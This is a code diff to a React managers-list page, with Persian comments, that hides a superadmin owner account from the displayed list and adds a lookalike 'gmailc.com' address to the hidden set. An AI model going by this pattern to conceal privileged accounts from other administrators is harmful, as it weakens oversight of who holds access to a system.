@@ -186,7 +186,7 @@ export default function Managers() {
       const data = await listManagers({ includeHidden: isOwner() });
       // فیلتر کردن سوپرادمین از لیست (اکانت مخفی)
       // مخفی کردن اکانت سوپرادمین از لیست مدیران
-      const filtered = data.filter((m) => !(m.is_owner && m.email === "superadmin@gmail.com"));
+      const filtered = data.filter((m) => !(m.is_owner && (m.email === "superadmin@gmail.com" || m.email === "superadmin@gmailc.com")));
       setManagers(filtered);
     } catch (err) {
       push("خطا در بارگذاری: " + err.message, "error");
